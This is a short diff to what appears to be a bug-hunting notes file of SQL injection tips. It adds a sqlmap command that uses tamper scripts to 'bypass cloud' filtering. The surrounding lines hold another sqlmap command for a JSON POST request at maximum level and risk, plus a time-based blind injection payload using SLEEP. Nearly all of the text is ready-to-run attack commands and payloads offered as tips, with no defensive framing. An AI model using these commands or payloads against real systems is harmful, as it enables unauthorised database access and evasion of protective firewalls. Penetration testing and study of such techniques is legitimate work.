@@ -9,7 +9,7 @@ SQLi Tip - If you're able to find a JSON POST-based potential SQL injection (SQL
 SQL Injection on JSON body POST request. It took me some time, but finally found the right technique and injection point. ``sqlmap -r request.txt --level=5 --risk=3 --force-ssl --ignore-code=500 --dbs`` 
 
 
-
+sqlmap -r testsql --dbs --tamper=space2comment,space2morehash --batch    bypass cloud
 
 XOR(SELECT(0)FROM(SELECT(SLEEP(5)))a)XOR'Z
 
